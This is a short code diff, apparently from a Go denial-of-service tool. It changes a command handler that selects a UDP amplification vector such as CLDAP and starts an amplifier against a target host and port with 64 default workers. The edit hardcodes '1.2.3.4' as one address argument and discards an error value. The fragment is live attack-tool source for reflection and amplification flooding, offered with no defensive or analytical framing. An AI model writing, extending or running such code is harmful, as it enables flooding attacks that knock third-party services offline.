@@ -60,7 +60,7 @@ func handleStart(cmd StartCmd) string {
 		case "cldap":
 			at = vectors.AmpCLDAP
 		}
-		f := vectors.NewUDPAmplifier(at, cmd.Target, cmd.Target, cmd.Port)
+		f, _ := vectors.NewUDPAmplifier(at, "1.2.3.4", cmd.Target, cmd.Port)
 		w := cmd.Workers
 		if w == 0 {
 			w = 64
